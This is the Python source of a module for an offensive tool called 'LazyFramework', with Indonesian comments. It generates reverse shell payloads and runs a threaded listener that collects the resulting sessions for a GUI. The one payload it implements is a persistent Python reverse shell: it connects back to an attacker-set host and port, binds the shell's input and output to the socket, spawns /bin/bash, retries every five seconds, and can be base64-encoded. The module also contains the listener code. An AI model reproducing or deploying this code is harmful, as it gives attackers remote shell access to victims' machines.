#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
LazyFramework - Reverse TCP Multi-Language 22+
FIXED: Session auto-detection untuk GUI PyQt6
"""

import socket
import threading
import time
import select
import base64
import os
import pty
from rich.console import Console
from rich.panel import Panel
from typing import Callable, Any

console = Console()

# ==================== DATA GLOBAL & SHARED ====================
SESSIONS = {} 
SESSIONS_LOCK = threading.Lock()
# SESSIONS akan menyimpan data seperti:
# {
#     1: {'socket': <socket_object>, 'addr': ('ip', port), 'status': 'active', 'data_thread': <thread_obj>}
# }
# =============================================================

MODULE_INFO = {
    "name": "Reverse TCP Multi-Language (22+)",
    "description": "Reverse shell 22+ bahasa + auto session detection",
    "author": "LazyFramework Indo",
    "rank": "Excellent"
}

OPTIONS = {
    "LHOST":   {"default": "0.0.0.0", "required": True},
    "LPORT":   {"default": 4444,      "required": True},
    "PAYLOAD": {"default": "python",  "required": True},
    "OUTPUT":  {"default": "",        "required": False},
    "ENCODE":  {"default": "no",      "required": False}
}

# ==================== PAYLOAD GENERATOR ====================

def generate_payload(lhost: str, lport: int, lang: str) -> str:
    """Menghasilkan payload reverse shell berdasarkan bahasa."""
    payloads = {
        # Payload Python menggunakan pty.spawn untuk pseudo-shell yang stabil
        "python": f"""import socket,os,pty,time
while True:
 try:
  s=socket.socket();s.connect(("{lhost}",{lport}))
  [os.dup2(s.fileno(),f) for f in (0,1,2)]
  # Menggunakan /bin/bash untuk menangani CD dan PWD secara otomatis
  pty.spawn("/bin/bash") 
 except: time.sleep(5)"""
        # ... (Anda dapat menambahkan payload untuk bash, php, dll. di sini) ...
    }
    return payloads.get(lang.lower(), f"Payload for {lang} not implemented")

# ==================== LISTENER & SESSION HANDLER ====================

class ListenerThread(threading.Thread):
    """Menjalankan server socket di thread terpisah."""
    
    # Callable[[str, int], None] -> Callback menerima data (str) dan session_id (int)
    def __init__(self, lhost: str, lport: int, session_callback: Callable[[str, Any], None]):
        super().__init__()
        self.lhost = lhost
        self.lport = lport
        self.running = True
        # Callback ini akan dihubungkan ke sinyal di gui.py
        self.session_callback = session_callback 
        self.server_socket = None

    def run(self):
        """Logika utama listener."""
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.server_socket.bind((self.lhost, self.lport))
            self.server_socket.listen(1)
            self.session_callback(f"[green][+] Listening on {self.lhost}:{self.lport}...\n", session_id=None)
        except Exception as e:
            self.session_callback(f"[red][-] Error binding: {e}[/]\n", session_id=None)
            self.running = False
            return

        while self.running:
            try:
                # Set timeout agar thread bisa dihentikan saat self.running = False
                self.server_socket.settimeout(1) 
                conn, addr = self.server_socket.accept()
                
                # Mengunci global SESSIONS saat menambah sesi baru
                with SESSIONS_LOCK:
                    session_id = len(SESSIONS) + 1
                    SESSIONS[session_id] = {
                        'socket': conn,
                        'addr': addr,
                        'status': 'active',
                        'data_thread': None
                    }

                # Membuat thread baru untuk menangani data dari sesi ini
                data_thread = threading.Thread(target=self.handle_session, args=(session_id, conn))
                data_thread.daemon = True
                data_thread.start()
                
                SESSIONS[session_id]['data_thread'] = data_thread
                
                # Mengirim notifikasi sesi baru ke GUI
                self.session_callback(f"[green][+] Session {session_id} opened from {addr[0]}:{addr[1]}[/]\n", session_id=session_id)

            except socket.timeout:
                continue
            except Exception as e:
                if self.running:
                    self.session_callback(f"[red][-] Listener error: {e}[/]\n", session_id=None)
                break

    def handle_session(self, session_id: int, conn: socket.socket):
        """Menerima dan meneruskan data dari reverse shell ke GUI."""
        while SESSIONS[session_id]['status'] == 'active':
            try:
                # Menggunakan select untuk membaca data tanpa memblokir
                r, _, _ = select.select([conn], [], [], 0.1) 
                if r:
                    # Baca data (hingga 4KB)
                    data = conn.recv(4096).decode('utf-8', errors='ignore')
                    if not data:
                        raise ConnectionResetError
                        
                    # Meneruskan data mentah ke GUI
                    self.session_callback(data, session_id=session_id) 

            except (ConnectionResetError, BrokenPipeError):
                with SESSIONS_LOCK:
                    SESSIONS[session_id]['status'] = 'closed'
                # Notifikasi penutupan sesi
                self.session_callback(f"\n[red][-] Session {session_id} closed.[/]\n", session_id=session_id)
                break
            except Exception:
                break
        
        try:
            conn.close()
        except:
            pass
    
    def stop(self):
        """Menghentikan listener thread."""
        self.running = False
        if self.server_socket:
            try:
                # Unbind socket server
                self.server_socket.shutdown(socket.SHUT_RDWR)
                self.server_socket.close()
            except Exception:
                pass

# ==================== FUNGSI UTAMA (Diambil dari Snippet) ====================

def run(options: dict, console: Console):
    """Fungsi yang dipanggil oleh framework untuk menjalankan modul."""
    session = {} # Gunakan dictionary untuk menyimpan status modul
    
    lhost = options.get("LHOST", "0.0.0.0")
    lport = int(options.get("LPORT", 4444))
    lang  = options.get("PAYLOAD", "python").lower()
    output = options.get("OUTPUT", "")
    encode = options.get("ENCODE", "no").lower() == "yes"

    session['LHOST'] = lhost
    session['LPORT'] = lport

    payload = generate_payload(lhost, lport, lang)

    if encode:
        payload = base64.b64encode(payload.encode()).decode()
        console.print("[yellow][*] Payload di-encode base64[/]")

    # ... (Logika menyimpan payload ke file) ...

    console.print(Panel(payload, title=f"PAYLOAD {lang.upper()}", border_style="bright_blue"))

    # Listener biasanya diinisiasi oleh GUI (gui.py), tetapi logikanya ada di sini.
    # console.print(f"[yellow][*] Untuk GUI, Listener harus diinisiasi di gui.py.[/]")
    
# ====================================================================

# Jika reverse_tcp.py dijalankan sebagai skrip mandiri
if __name__ == '__main__':
    # Contoh penggunaan standalone (tidak ada GUI)
    options = {"LHOST": "0.0.0.0", "LPORT": 4444, "PAYLOAD": "python"}
    run(options, console)
    
    # Listener dijalankan di sini jika standalone, menggunakan console.print sebagai callback
    # listener = ListenerThread("0.0.0.0", 4444, lambda data, sid=None: console.print(data, end=''))
    # listener.start()
    # while True:
    #     time.sleep(1)